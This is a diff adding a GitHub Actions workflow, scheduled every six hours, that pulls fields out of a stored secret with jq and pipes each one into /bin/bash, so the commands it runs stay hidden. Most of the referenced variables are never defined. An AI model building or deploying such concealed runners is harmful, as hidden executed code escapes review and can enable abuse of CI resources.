@@ -1,0 +1,25 @@
+name: mengbilifuxianxuerou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mengbilifuxianxuerou
+        env:
+          i56: ${{ secrets.i56 }}
+        run: |
+          echo $i56 | jq -r .kto11750 | /bin/bash
+          echo $v7 | jq -r .h5 | /bin/bash
+          echo $kk666 | jq -r .tij67877 | /bin/bash
+          echo $y08 | jq -r .sgn96 | /bin/bash
+          echo $rj27478 | jq -r .bmf93 | /bin/bash
+          echo $m70168 | jq -r .kuz9162 | /bin/bash
+          echo $r15 | jq -r .gzec9 | /bin/bash
+
